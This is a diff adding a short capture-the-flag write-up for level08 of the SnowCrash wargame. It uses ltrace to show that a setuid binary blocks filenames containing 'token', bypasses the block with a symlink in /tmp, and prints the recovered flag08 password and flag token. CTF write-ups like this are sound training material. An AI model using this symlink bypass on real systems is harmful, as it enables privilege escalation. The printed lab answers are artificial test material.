@@ -1,0 +1,30 @@
+1/ ls -la
+-rwsr-s---+ flag08 level08 8617 Mar 5 2016 level08
+-rw-------- flag08 flag08    26 Mar 5 2016 token
+
+2/ LTRACE ANALYSIS
+level08@SnowCrash:~$ ltrace ./level08 
+__libc_start_main(0x8048554, 1, 0xbffff694, 0x80486b0, 0x8048720 <unfinished ...>
+printf("%s [file to read]\n", "./level08"./level08 [file to read]
+)                                                               = 25
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+level08@SnowCrash:~$ ltrace ./level08 token 
+__libc_start_main(0x8048554, 2, 0xbffff694, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                                                 = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                                                             = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+3/ We need level08 binary to open the token file for us
+>> He does not want to open any file called "token"
+>> We can trick it using symlink:
+ln -s $(pwd)/token /tmp/toktok
+./level08 /tmp/toktok
+
+4/ level08@SnowCrash:~$ su flag08
+Password: quif5eloekouj29ke0vouxean
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
